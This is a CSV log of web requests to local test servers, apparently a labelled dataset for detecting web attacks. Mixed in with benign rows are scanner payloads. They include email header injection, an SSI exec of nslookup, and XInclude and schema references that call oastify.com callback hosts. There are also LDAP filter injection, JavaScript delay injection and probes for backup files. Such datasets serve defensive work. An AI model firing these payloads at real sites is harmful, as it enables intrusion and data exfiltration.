timestamp,source_ip,target_url,user_agent,ddos_score,payload_length,text,label
2026-01-02T04:51:25.043976,127.0.0.1,http://localhost:8080/products?search=mtTZWw,unknown,0,44,http://localhost:8080/products?search=mtTZWw unknown,0
2026-01-02T04:51:25.000590,127.0.0.1,http://localhost:5000/protected/products?search=mtTZWw,unknown,0,54,http://localhost:5000/protected/products?search=mtTZWw unknown,0
2026-01-02T04:51:24.315865,127.0.0.1,http://localhost:8080/products?search=mtTZWw,unknown,0,44,http://localhost:8080/products?search=mtTZWw unknown,0
2026-01-02T04:51:24.290772,127.0.0.1,http://localhost:5000/protected/products?search=mtTZWw,unknown,0,54,http://localhost:5000/protected/products?search=mtTZWw unknown,0
2026-01-02T04:51:23.527038,127.0.0.1,http://localhost:8080/products?search=mtTZWw,unknown,0,44,http://localhost:8080/products?search=mtTZWw unknown,0
2026-01-02T04:51:23.500946,127.0.0.1,http://localhost:5000/protected/products?search=mtTZWw,unknown,0,54,http://localhost:5000/protected/products?search=mtTZWw unknown,0
2026-01-02T04:51:22.804435,127.0.0.1,http://localhost:8080/products?search=mtTZWw,unknown,0,44,http://localhost:8080/products?search=mtTZWw unknown,0
2026-01-02T04:51:22.769627,127.0.0.1,http://localhost:5000/protected/products?search=mtTZWw,unknown,0,54,http://localhost:5000/protected/products?search=mtTZWw unknown,0
2026-01-02T04:51:21.759668,127.0.0.1,http://localhost:8080/products?search=mtTZWw,unknown,0,44,http://localhost:8080/products?search=mtTZWw unknown,0
2026-01-02T04:51:21.746370,127.0.0.1,http://localhost:5000/protected/products?search=mtTZWw,unknown,0,54,http://localhost:5000/protected/products?search=mtTZWw unknown,0
2026-01-02T04:51:21.728211,127.0.0.1,http://localhost:31497/protected/products?search=mtTZWw&a8x9lau3wx=1,unknown,0,68,http://localhost:31497/protected/products?search=mtTZWw&a8x9lau3wx=1 unknown,2
2026-01-02T04:51:21.707916,127.0.0.1,http://wzzllgz29a3vvftjajwpprmwjnphdb15vtlgb40.oastify.com/protected/products?search=mtTZWw&9k0q2oygbq=1,unknown,0,104,http://wzzllgz29a3vvftjajwpprmwjnphdb15vtlgb40.oastify.com/protected/products?search=mtTZWw&9k0q2oygbq=1 unknown,2
2026-01-02T04:51:21.672395,127.0.0.1,http://localhost:5000/protected/products?search=mtTZWw&9sdb42a6wy=1&utm_content=m5hrpywpnw,unknown,0,90,http://localhost:5000/protected/products?search=mtTZWw&9sdb42a6wy=1&utm_content=m5hrpywpnw unknown,2
2026-01-02T04:51:20.745047,127.0.0.1,http://localhost:8080/products?search=mtTZWw,unknown,0,44,http://localhost:8080/products?search=mtTZWw unknown,0
2026-01-02T04:51:20.729980,127.0.0.1,http://localhost:5000/protected/products?search=mtTZWw,unknown,0,54,http://localhost:5000/protected/products?search=mtTZWw unknown,0
2026-01-02T04:51:20.708788,localhost:5000,http://localhost:5000/protected/products?search=mtTZWw&v3awamqhgq=1,unknown,0,67,http://localhost:5000/protected/products?search=mtTZWw&v3awamqhgq=1 unknown,2
2026-01-02T04:51:20.689838,oumdg8uu42ynq7ob5brhkjhoefk983wwxkn7dv2.oastify.com,http://localhost:5000/protected/products?search=mtTZWw&dhpxu9tde2=1,unknown,0,67,http://localhost:5000/protected/products?search=mtTZWw&dhpxu9tde2=1 unknown,2
2026-01-02T04:51:20.667269,127.0.0.1,http://localhost:5000/protected/products?search=mtTZWw&wajpid4hvc=1,unknown,0,67,http://localhost:5000/protected/products?search=mtTZWw&wajpid4hvc=1 unknown,2
2026-01-02T04:51:20.635425,127.0.0.1,http://localhost:5000/protected/products?search=mtTZWw&wklcull3mt=1,unknown,0,67,http://localhost:5000/protected/products?search=mtTZWw&wklcull3mt=1 unknown,2
2026-01-02T04:51:19.746555,127.0.0.1,http://localhost:8080/products?search=mtTZWw,unknown,0,44,http://localhost:8080/products?search=mtTZWw unknown,0
2026-01-02T04:51:19.730985,127.0.0.1,http://localhost:5000/protected/products?search=mtTZWw,unknown,0,54,http://localhost:5000/protected/products?search=mtTZWw unknown,0
2026-01-02T04:51:19.023427,127.0.0.1,http://localhost:8080/products?search=mtTZWw,unknown,0,44,http://localhost:8080/products?search=mtTZWw unknown,0
2026-01-02T04:51:19.008897,127.0.0.1,http://localhost:5000/protected/products?search=mtTZWw,unknown,0,54,http://localhost:5000/protected/products?search=mtTZWw unknown,0
2026-01-02T04:51:18.310416,127.0.0.1,http://localhost:8080/products?search=mtTZWw,unknown,0,44,http://localhost:8080/products?search=mtTZWw unknown,0
2026-01-02T04:51:18.285387,127.0.0.1,http://localhost:5000/protected/products?search=mtTZWw,unknown,0,54,http://localhost:5000/protected/products?search=mtTZWw unknown,0
2026-01-02T04:51:17.355796,127.0.0.1,http://localhost:8080/products?search=mtTZWw,unknown,0,44,http://localhost:8080/products?search=mtTZWw unknown,0
2026-01-02T04:51:17.307945,127.0.0.1,http://localhost:5000/protected/products?search=mtTZWw,unknown,0,54,http://localhost:5000/protected/products?search=mtTZWw unknown,0
2026-01-02T04:51:16.584237,,http://localhost:8080/products?search=mtTZWw,unknown,0,44,http://localhost:8080/products?search=mtTZWw unknown,0
2026-01-02T04:51:16.536516,127.0.0.1,http://localhost:5000/protected/products?search=mtTZWw,unknown,0,54,http://localhost:5000/protected/products?search=mtTZWw unknown,0
2026-01-02T04:51:15.582774,127.0.0.1,http://localhost:8080/products?search=mtTZWw,unknown,0,44,http://localhost:8080/products?search=mtTZWw unknown,0
2026-01-02T04:51:15.558443,127.0.0.1,http://localhost:5000/protected/products?search=mtTZWw,unknown,0,54,http://localhost:5000/protected/products?search=mtTZWw unknown,0
2026-01-02T04:51:14.865571,127.0.0.1,http://localhost:8080/products?search=mtTZWw,unknown,0,44,http://localhost:8080/products?search=mtTZWw unknown,0
2026-01-02T04:51:14.827246,127.0.0.1,http://localhost:5000/protected/products?search=mtTZWw,unknown,0,54,http://localhost:5000/protected/products?search=mtTZWw unknown,0
2026-01-02T04:51:14.123441,127.0.0.1,http://localhost:8080/upload_backup,unknown,0,35,http://localhost:8080/upload_backup unknown,0
2026-01-02T04:51:14.086939,127.0.0.1,http://localhost:5000/protected/upload_backup,unknown,0,45,http://localhost:5000/protected/upload_backup unknown,0
2026-01-02T04:51:13.693654,127.0.0.1,http://localhost:8080/products?search=mtTZWw,unknown,0,44,http://localhost:8080/products?search=mtTZWw unknown,0
2026-01-02T04:51:13.253930,127.0.0.1,http://localhost:8080/products_backup,unknown,0,37,http://localhost:8080/products_backup unknown,0
2026-01-02T04:51:13.239883,127.0.0.1,http://localhost:5000/protected/products?search=mtTZWw,unknown,0,54,http://localhost:5000/protected/products?search=mtTZWw unknown,0
2026-01-02T04:51:13.213466,127.0.0.1,http://localhost:5000/protected/products_backup,unknown,0,47,http://localhost:5000/protected/products_backup unknown,0
2026-01-02T04:51:12.722562,127.0.0.1,http://localhost:8080/upload_bak,unknown,0,32,http://localhost:8080/upload_bak unknown,0
2026-01-02T04:51:12.685134,127.0.0.1,http://localhost:5000/protected/upload_bak,unknown,0,42,http://localhost:5000/protected/upload_bak unknown,0
2026-01-02T04:51:12.245426,127.0.0.1,http://localhost:8080/products_bak,unknown,0,34,http://localhost:8080/products_bak unknown,0
2026-01-02T04:51:12.215409,127.0.0.1,http://localhost:5000/protected/products_bak,unknown,0,44,http://localhost:5000/protected/products_bak unknown,0
2026-01-02T04:51:11.657911,127.0.0.1,http://localhost:8080/products?search=mtTZWw,unknown,0,44,http://localhost:8080/products?search=mtTZWw unknown,0
2026-01-02T04:51:11.622135,127.0.0.1,http://localhost:5000/protected/products?search=mtTZWw,unknown,0,54,http://localhost:5000/protected/products?search=mtTZWw unknown,0
2026-01-02T04:51:11.089016,127.0.0.1,http://localhost:8080/backup_upload,unknown,0,35,http://localhost:8080/backup_upload unknown,0
2026-01-02T04:51:11.034313,127.0.0.1,http://localhost:5000/protected/backup_upload,unknown,0,45,http://localhost:5000/protected/backup_upload unknown,0
2026-01-02T04:51:10.681729,127.0.0.1,http://localhost:8080/upload_old,unknown,0,32,http://localhost:8080/upload_old unknown,0
2026-01-02T04:51:10.648702,127.0.0.1,http://localhost:5000/protected/upload_old,unknown,0,42,http://localhost:5000/protected/upload_old unknown,0
2026-01-02T04:51:10.282265,127.0.0.1,http://localhost:8080/backup_products,unknown,0,37,http://localhost:8080/backup_products unknown,0
2026-01-02T04:51:09.940610,127.0.0.1,http://localhost:8080/products_old,unknown,0,34,http://localhost:8080/products_old unknown,0
2026-01-02T04:51:09.932472,127.0.0.1,http://localhost:5000/protected/backup_products,unknown,0,47,http://localhost:5000/protected/backup_products unknown,0
2026-01-02T04:51:09.912760,127.0.0.1,http://localhost:5000/protected/products_old,unknown,0,44,http://localhost:5000/protected/products_old unknown,0
2026-01-02T04:51:09.572290,127.0.0.1,http://localhost:8080/products?search=mtTZWw,unknown,0,44,http://localhost:8080/products?search=mtTZWw unknown,0
2026-01-02T04:51:09.257759,127.0.0.1,http://localhost:8080/bak_upload,unknown,0,32,http://localhost:8080/bak_upload unknown,0
2026-01-02T04:51:09.235047,127.0.0.1,http://localhost:5000/protected/products?search=mtTZWw,unknown,0,54,http://localhost:5000/protected/products?search=mtTZWw unknown,0
2026-01-02T04:51:08.925757,127.0.0.1,http://localhost:8080/upload1,unknown,0,29,http://localhost:8080/upload1 unknown,0
2026-01-02T04:51:08.918505,127.0.0.1,http://localhost:5000/protected/bak_upload,unknown,0,42,http://localhost:5000/protected/bak_upload unknown,0
2026-01-02T04:51:08.910349,127.0.0.1,http://localhost:5000/protected/upload1,unknown,0,39,http://localhost:5000/protected/upload1 unknown,0
2026-01-02T04:51:08.897486,127.0.0.1,http://localhost:5000/protected/products?ay0khzhnz2=1,unknown,0,53,http://localhost:5000/protected/products?ay0khzhnz2=1 unknown,2
2026-01-02T04:51:08.868247,127.0.0.1,http://localhost:5000/protected/products?search=fr240lp63s&tkhasbg10v=1,unknown,0,71,http://localhost:5000/protected/products?search=fr240lp63s&tkhasbg10v=1 unknown,2
2026-01-02T04:51:08.543782,127.0.0.1,http://localhost:8080/products1,unknown,0,31,http://localhost:8080/products1 unknown,0
2026-01-02T04:51:08.219060,127.0.0.1,http://localhost:8080/bak_products,unknown,0,34,http://localhost:8080/bak_products unknown,0
2026-01-02T04:51:08.209848,127.0.0.1,http://localhost:5000/protected/products1,unknown,0,41,http://localhost:5000/protected/products1 unknown,0
2026-01-02T04:51:08.200964,127.0.0.1,http://localhost:5000/protected/bak_products,unknown,0,44,http://localhost:5000/protected/bak_products unknown,0
2026-01-02T04:51:07.855989,127.0.0.1,http://localhost:8080/old_upload,unknown,0,32,http://localhost:8080/old_upload unknown,0
2026-01-02T04:51:07.545573,127.0.0.1,http://localhost:8080/upload - Copy,unknown,0,35,http://localhost:8080/upload - Copy unknown,0
2026-01-02T04:51:07.537117,127.0.0.1,http://localhost:5000/protected/old_upload,unknown,0,42,http://localhost:5000/protected/old_upload unknown,0
2026-01-02T04:51:07.505439,127.0.0.1,http://localhost:5000/protected/upload - Copy,unknown,0,45,http://localhost:5000/protected/upload - Copy unknown,0
2026-01-02T04:51:07.160315,127.0.0.1,http://localhost:8080/old_products,unknown,0,34,http://localhost:8080/old_products unknown,0
2026-01-02T04:51:06.850203,127.0.0.1,http://localhost:8080/products - Copy,unknown,0,37,http://localhost:8080/products - Copy unknown,0
2026-01-02T04:51:06.841988,127.0.0.1,http://localhost:5000/protected/old_products,unknown,0,44,http://localhost:5000/protected/old_products unknown,0
2026-01-02T04:51:06.832237,127.0.0.1,http://localhost:5000/protected/products - Copy,unknown,0,47,http://localhost:5000/protected/products - Copy unknown,0
2026-01-02T04:51:06.524805,127.0.0.1,http://localhost:8080/products?search=mtTZWw,unknown,0,44,http://localhost:8080/products?search=mtTZWw unknown,0
2026-01-02T04:51:06.515619,127.0.0.1,http://localhost:5000/protected/products?search=mtTZWw,unknown,0,54,http://localhost:5000/protected/products?search=mtTZWw unknown,0
2026-01-02T04:51:06.477779,127.0.0.1,http://localhost:5000/protected/products?search=mtTZWw%3e%0d%0aBCC%3awmml8gm2waqvifgjxjjpcr9w6nch0bo3ir9ez2o@oastify.com%0d%0avxm%3a%20i,unknown,0,136,http://localhost:5000/protected/products?search=mtTZWw%3e%0d%0aBCC%3awmml8gm2waqvifgjxjjpcr9w6nch0bo3ir9ez2o@oastify.com%0d%0avxm%3a%20i unknown,2
2026-01-02T04:51:06.161191,127.0.0.1,http://localhost:8080/upload (copy),unknown,0,35,http://localhost:8080/upload (copy) unknown,0
2026-01-02T04:51:05.854585,127.0.0.1,http://localhost:8080/Copy of upload,unknown,0,36,http://localhost:8080/Copy of upload unknown,0
2026-01-02T04:51:05.846995,127.0.0.1,http://localhost:5000/protected/products?search=mtTZWw%0d%0aBCC%3a042pqk46ee8z0jynfn1tuvr0orulif67zvqig65@oastify.com%0d%0aftq%3a%20z,unknown,0,133,http://localhost:5000/protected/products?search=mtTZWw%0d%0aBCC%3a042pqk46ee8z0jynfn1tuvr0orulif67zvqig65@oastify.com%0d%0aftq%3a%20z unknown,2
2026-01-02T04:51:05.839302,127.0.0.1,http://localhost:5000/protected/upload (copy),unknown,0,45,http://localhost:5000/protected/upload (copy) unknown,0
2026-01-02T04:51:05.816276,127.0.0.1,http://localhost:5000/protected/Copy of upload,unknown,0,46,http://localhost:5000/protected/Copy of upload unknown,0
2026-01-02T04:51:05.511129,127.0.0.1,http://localhost:8080/Copy of products,unknown,0,38,http://localhost:8080/Copy of products unknown,0
2026-01-02T04:51:05.189115,127.0.0.1,http://localhost:8080/products (copy),unknown,0,37,http://localhost:8080/products (copy) unknown,0
2026-01-02T04:51:05.179752,127.0.0.1,http://localhost:5000/protected/Copy of products,unknown,0,48,http://localhost:5000/protected/Copy of products unknown,0
2026-01-02T04:51:05.161379,127.0.0.1,http://localhost:5000/protected/products (copy),unknown,0,47,http://localhost:5000/protected/products (copy) unknown,0
2026-01-02T04:51:04.573250,127.0.0.1,http://localhost:8080/upload,unknown,0,28,http://localhost:8080/upload unknown,0
2026-01-02T04:51:04.198510,127.0.0.1,http://localhost:8080/products?search=mtTZWw,unknown,0,44,http://localhost:8080/products?search=mtTZWw unknown,0
2026-01-02T04:51:04.189366,127.0.0.1,http://localhost:5000/protected/upload,unknown,0,38,http://localhost:5000/protected/upload unknown,0
2026-01-02T04:51:04.166189,127.0.0.1,http://localhost:5000/protected/products?search=mtTZWw,unknown,0,54,http://localhost:5000/protected/products?search=mtTZWw unknown,0
2026-01-02T04:51:04.147340,127.0.0.1,http://localhost:5000/protected/products?search=%22--%3e'--%3e%60--%3e%3c!--%23set%20var%3d%22skz%22%20value%3d%22rjyg5bjxt5%22--%3e%3c!--%23set%20var%3d%22um1%22%20value%3d%22tl0i7dlzv7%22--%3e%3c!--%23echo%20var%3d%22skz%22--%3e%3c!--%23echo%20var%3d%22um1%22--%3e%3c!--%23exec%20cmd%3d%22nslookup%20-q%3dcname%20e6l3sy6kgsad2x01h137w9teq5wzkt8l69xwnkc.oastify.com%22%20--%3e,unknown,0,377,http://localhost:5000/protected/products?search=%22--%3e'--%3e%60--%3e%3c!--%23set%20var%3d%22skz%22%20value%3d%22rjyg5bjxt5%22--%3e%3c!--%23set%20var%3d%22um1%22%20value%3d%22tl0i7dlzv7%22--%3e%3c!--%23echo%20var%3d%22skz%22--%3e%3c!--%23echo%20var%3d%22um1%22--%3e%3c!--%23exec%20cmd%3d%22nslookup%20-q%3dcname%20e6l3sy6kgsad2x01h137w9teq5wzkt8l69xwnkc.oastify.com%22%20--%3e unknown,2
2026-01-02T04:51:03.748678,127.0.0.1,http://localhost:8080/products,unknown,0,30,http://localhost:8080/products unknown,0
2026-01-02T04:51:03.728006,127.0.0.1,http://localhost:5000/protected/products,unknown,0,40,http://localhost:5000/protected/products unknown,0
2026-01-02T04:51:03.285943,127.0.0.1,http://localhost:8080/upload,unknown,0,28,http://localhost:8080/upload unknown,0
2026-01-02T04:51:03.260964,127.0.0.1,http://localhost:5000/protected/upload,unknown,0,38,http://localhost:5000/protected/upload unknown,0
2026-01-02T04:51:02.811417,127.0.0.1,http://localhost:8080/products,unknown,0,30,http://localhost:8080/products unknown,0
2026-01-02T04:51:02.458413,127.0.0.1,http://localhost:8080/register_backup,unknown,0,37,http://localhost:8080/register_backup unknown,0
2026-01-02T04:51:02.446306,127.0.0.1,http://localhost:5000/protected/products,unknown,0,40,http://localhost:5000/protected/products unknown,0
2026-01-02T04:51:02.082617,127.0.0.1,http://localhost:8080/products?search=mtTZWw,unknown,0,44,http://localhost:8080/products?search=mtTZWw unknown,0
2026-01-02T04:51:02.073711,127.0.0.1,http://localhost:5000/protected/register_backup,unknown,0,47,http://localhost:5000/protected/register_backup unknown,0
2026-01-02T04:51:02.054212,127.0.0.1,http://localhost:5000/protected/products?search=mtTZWw,unknown,0,54,http://localhost:5000/protected/products?search=mtTZWw unknown,0
2026-01-02T04:51:02.014932,127.0.0.1,http://localhost:5000/protected/products?search=mtTZWw'%2b(function()%7bif(typeof%20fppnf%3d%3d%3d%22undefined%22)%7bvar%20a%3dnew%20Date()%3bdo%7bvar%20b%3dnew%20Date()%3b%7dwhile(b-a%3c20000)%3bfppnf%3d1%3b%7d%7d())%2b',unknown,0,221,http://localhost:5000/protected/products?search=mtTZWw'%2b(function()%7bif(typeof%20fppnf%3d%3d%3d%22undefined%22)%7bvar%20a%3dnew%20Date()%3bdo%7bvar%20b%3dnew%20Date()%3b%7dwhile(b-a%3c20000)%3bfppnf%3d1%3b%7d%7d())%2b' unknown,2
2026-01-02T04:51:01.639468,127.0.0.1,http://localhost:8080/upload,unknown,0,28,http://localhost:8080/upload unknown,0
2026-01-02T04:51:01.604141,127.0.0.1,http://localhost:5000/protected/upload,unknown,0,38,http://localhost:5000/protected/upload unknown,0
2026-01-02T04:51:01.288889,127.0.0.1,http://localhost:8080/register_bak,unknown,0,34,http://localhost:8080/register_bak unknown,0
2026-01-02T04:51:01.267990,127.0.0.1,http://localhost:5000/protected/register_bak,unknown,0,44,http://localhost:5000/protected/register_bak unknown,0
2026-01-02T04:51:00.857696,127.0.0.1,http://localhost:8080/products,unknown,0,30,http://localhost:8080/products unknown,0
2026-01-02T04:51:00.832440,127.0.0.1,http://localhost:5000/protected/products,unknown,0,40,http://localhost:5000/protected/products unknown,0
2026-01-02T04:51:00.449476,127.0.0.1,http://localhost:8080/upload,unknown,0,28,http://localhost:8080/upload unknown,0
2026-01-02T04:51:00.122577,127.0.0.1,http://localhost:8080/products?search=mtTZWw,unknown,0,44,http://localhost:8080/products?search=mtTZWw unknown,0
2026-01-02T04:50:59.772850,127.0.0.1,http://localhost:8080/register_old,unknown,0,34,http://localhost:8080/register_old unknown,0
2026-01-02T04:50:59.761329,127.0.0.1,http://localhost:5000/protected/upload,unknown,0,38,http://localhost:5000/protected/upload unknown,0
2026-01-02T04:50:59.740887,127.0.0.1,http://localhost:5000/protected/products?search=mtTZWw,unknown,0,54,http://localhost:5000/protected/products?search=mtTZWw unknown,0
2026-01-02T04:50:59.716104,127.0.0.1,http://localhost:5000/protected/register_old,unknown,0,44,http://localhost:5000/protected/register_old unknown,0
2026-01-02T04:50:59.359907,127.0.0.1,http://localhost:8080/backup_register,unknown,0,37,http://localhost:8080/backup_register unknown,0
2026-01-02T04:50:59.347744,127.0.0.1,http://localhost:5000/protected/backup_register,unknown,0,47,http://localhost:5000/protected/backup_register unknown,0
2026-01-02T04:50:59.336447,127.0.0.1,http://localhost:5000/protected/products?search=mtTZWw]]%3e%3e%3c,unknown,0,65,http://localhost:5000/protected/products?search=mtTZWw]]%3e%3e%3c unknown,2
2026-01-02T04:50:59.305223,127.0.0.1,http://localhost:5000/protected/products?search=%3cwwx%20xmlns%3axi%3d%22http%3a%2f%2fwww.w3.org%2f2001%2fXInclude%22%3e%3cxi%3ainclude%20href%3d%22http%3a%2f%2fz22ooj25cd6yyiwmdmzssupzmqskge4fs6fw3l.oastify.com%2ffoo%22%2f%3e%3c%2fwwx%3e,unknown,0,238,http://localhost:5000/protected/products?search=%3cwwx%20xmlns%3axi%3d%22http%3a%2f%2fwww.w3.org%2f2001%2fXInclude%22%3e%3cxi%3ainclude%20href%3d%22http%3a%2f%2fz22ooj25cd6yyiwmdmzssupzmqskge4fs6fw3l.oastify.com%2ffoo%22%2f%3e%3c%2fwwx%3e unknown,2
2026-01-02T04:50:58.945512,127.0.0.1,http://localhost:8080/products,unknown,0,30,http://localhost:8080/products unknown,0
2026-01-02T04:50:58.934880,127.0.0.1,http://localhost:5000/protected/products,unknown,0,40,http://localhost:5000/protected/products unknown,0
2026-01-02T04:50:58.888755,127.0.0.1,http://localhost:5000/protected/products?search=%3czrf%20xmlns%3d%22http%3a%2f%2fa.b%2f%22%20xmlns%3axsi%3d%22http%3a%2f%2fwww.w3.org%2f2001%2fXMLSchema-instance%22%20xsi%3aschemaLocation%3d%22http%3a%2f%2fa.b%2f%20http%3a%2f%2ft93ivd9zj7ds5c3gkg6mzowttkzen8b8zzmpae.oastify.com%2fzrf.xsd%22%3ezrf%3c%2fzrf%3e,unknown,0,309,http://localhost:5000/protected/products?search=%3czrf%20xmlns%3d%22http%3a%2f%2fa.b%2f%22%20xmlns%3axsi%3d%22http%3a%2f%2fwww.w3.org%2f2001%2fXMLSchema-instance%22%20xsi%3aschemaLocation%3d%22http%3a%2f%2fa.b%2f%20http%3a%2f%2ft93ivd9zj7ds5c3gkg6mzowttkzen8b8zzmpae.oastify.com%2fzrf.xsd%22%3ezrf%3c%2fzrf%3e unknown,2
2026-01-02T04:50:58.505449,127.0.0.1,http://localhost:8080/register1,unknown,0,31,http://localhost:8080/register1 unknown,0
2026-01-02T04:50:58.470328,127.0.0.1,http://localhost:5000/protected/register1,unknown,0,41,http://localhost:5000/protected/register1 unknown,0
2026-01-02T04:50:58.130430,127.0.0.1,http://localhost:8080/upload,unknown,0,28,http://localhost:8080/upload unknown,0
2026-01-02T04:50:57.772558,127.0.0.1,http://localhost:8080/bak_register,unknown,0,34,http://localhost:8080/bak_register unknown,0
2026-01-02T04:50:57.745854,127.0.0.1,http://localhost:5000/protected/upload,unknown,0,38,http://localhost:5000/protected/upload unknown,0
2026-01-02T04:50:57.382316,127.0.0.1,http://localhost:8080/register - Copy,unknown,0,37,http://localhost:8080/register - Copy unknown,0
2026-01-02T04:50:57.373531,127.0.0.1,http://localhost:5000/protected/bak_register,unknown,0,44,http://localhost:5000/protected/bak_register unknown,0
2026-01-02T04:50:57.361993,127.0.0.1,http://localhost:5000/protected/register - Copy,unknown,0,47,http://localhost:5000/protected/register - Copy unknown,0
2026-01-02T04:50:56.968340,127.0.0.1,http://localhost:8080/products?search=mtTZWw,unknown,0,44,http://localhost:8080/products?search=mtTZWw unknown,0
2026-01-02T04:50:56.641014,127.0.0.1,http://localhost:8080/products,unknown,0,30,http://localhost:8080/products unknown,0
2026-01-02T04:50:56.632001,127.0.0.1,http://localhost:5000/protected/products?search=mtTZWw,unknown,0,54,http://localhost:5000/protected/products?search=mtTZWw unknown,0
2026-01-02T04:50:56.596097,127.0.0.1,http://localhost:5000/protected/products,unknown,0,40,http://localhost:5000/protected/products unknown,0
2026-01-02T04:50:56.274397,127.0.0.1,http://localhost:8080/old_register,unknown,0,34,http://localhost:8080/old_register unknown,0
2026-01-02T04:50:56.265194,127.0.0.1,http://localhost:5000/protected/old_register,unknown,0,44,http://localhost:5000/protected/old_register unknown,0
2026-01-02T04:50:56.256929,127.0.0.1,http://localhost:5000/protected/products?search=*)(!(!(!(objectClass%3d*))),unknown,0,75,http://localhost:5000/protected/products?search=*)(!(!(!(objectClass%3d*))) unknown,2
2026-01-02T04:50:56.248974,127.0.0.1,http://localhost:21878/protected/products?nrmosunix3=1,unknown,0,54,http://localhost:21878/protected/products?nrmosunix3=1 unknown,2
2026-01-02T04:50:56.234115,127.0.0.1,http://q5wfra5wf49p19zdgd2jvlsqphvbj2aq4ksaf03p.oastify.com/protected/products?r1e9hpa673=1,unknown,0,91,http://q5wfra5wf49p19zdgd2jvlsqphvbj2aq4ksaf03p.oastify.com/protected/products?r1e9hpa673=1 unknown,2
2026-01-02T04:50:56.209675,127.0.0.1,http://localhost:5000/protected/products?search=*)(!(!(objectClass%3d*)),unknown,0,72,http://localhost:5000/protected/products?search=*)(!(!(objectClass%3d*)) unknown,2
2026-01-02T04:50:55.878140,127.0.0.1,http://localhost:8080/upload?gwgdv7v27f=1,unknown,0,41,http://localhost:8080/upload?gwgdv7v27f=1 unknown,0
2026-01-02T04:50:55.866320,127.0.0.1,http://localhost:5000/protected/products?3v9w4mwxja=1&utm_content=p5zqa439en,unknown,0,76,http://localhost:5000/protected/products?3v9w4mwxja=1&utm_content=p5zqa439en unknown,2
2026-01-02T04:50:55.502410,127.0.0.1,http://localhost:8080/register (copy),unknown,0,37,http://localhost:8080/register (copy) unknown,0
2026-01-02T04:50:55.467514,127.0.0.1,http://localhost:19649/protected/upload?gwgdv7v27f=1,unknown,0,52,http://localhost:19649/protected/upload?gwgdv7v27f=1 unknown,0
2026-01-02T04:50:55.145980,127.0.0.1,http://localhost:8080/Copy of register,unknown,0,38,http://localhost:8080/Copy of register unknown,0
2026-01-02T04:50:55.137109,127.0.0.1,http://localhost:5000/protected/products?search=*)(!(objectClass%3d*),unknown,0,69,http://localhost:5000/protected/products?search=*)(!(objectClass%3d*) unknown,2
2026-01-02T04:50:55.127113,127.0.0.1,http://localhost:5000/protected/register (copy),unknown,0,47,http://localhost:5000/protected/register (copy) unknown,0
2026-01-02T04:50:55.114676,127.0.0.1,http://localhost:5000/protected/Copy of register,unknown,0,48,http://localhost:5000/protected/Copy of register unknown,0
2026-01-02T04:50:55.088753,127.0.0.1,http://localhost:5000/protected/products?search=*)(objectClass%3d*,unknown,0,66,http://localhost:5000/protected/products?search=*)(objectClass%3d* unknown,2
2026-01-02T04:50:54.486825,127.0.0.1,http://localhost:8080/upload?4cv4hp8c0f=1,unknown,0,41,http://localhost:8080/upload?4cv4hp8c0f=1 unknown,0
2026-01-02T04:50:54.472326,127.0.0.1,http://9eoy0tefoni8as8wpwb24419y04usli9c30tnjb8.oastify.com/protected/upload?4cv4hp8c0f=1,unknown,0,89,http://9eoy0tefoni8as8wpwb24419y04usli9c30tnjb8.oastify.com/protected/upload?4cv4hp8c0f=1 unknown,0
2026-01-02T04:50:54.442215,127.0.0.1,http://localhost:5000/protected/upload?w7gcnurai9=1&utm_content=gfd222tkc2,unknown,0,74,http://localhost:5000/protected/upload?w7gcnurai9=1&utm_content=gfd222tkc2 unknown,2
2026-01-02T04:50:54.104446,127.0.0.1,http://localhost:8080/login,unknown,0,27,http://localhost:8080/login unknown,0
2026-01-02T04:50:54.093510,127.0.0.1,http://localhost:5000/protected/login,unknown,0,37,http://localhost:5000/protected/login unknown,0
2026-01-02T04:50:53.729811,127.0.0.1,http://localhost:8080/register,unknown,0,30,http://localhost:8080/register unknown,0
2026-01-02T04:50:53.385915,127.0.0.1,http://localhost:8080/products,unknown,0,30,http://localhost:8080/products unknown,0
2026-01-02T04:50:53.042743,127.0.0.1,http://localhost:8080/products?search=mtTZWw,unknown,0,44,http://localhost:8080/products?search=mtTZWw unknown,0
2026-01-02T04:50:52.701391,127.0.0.1,http://localhost:8080/upload,unknown,0,28,http://localhost:8080/upload unknown,0
2026-01-02T04:50:52.692605,127.0.0.1,http://localhost:5000/protected/register,unknown,0,40,http://localhost:5000/protected/register unknown,0
2026-01-02T04:50:52.683434,127.0.0.1,http://localhost:5000/protected/products,unknown,0,40,http://localhost:5000/protected/products unknown,0
2026-01-02T04:50:52.675288,127.0.0.1,http://localhost:5000/protected/products?search=mtTZWw,unknown,0,54,http://localhost:5000/protected/products?search=mtTZWw unknown,0
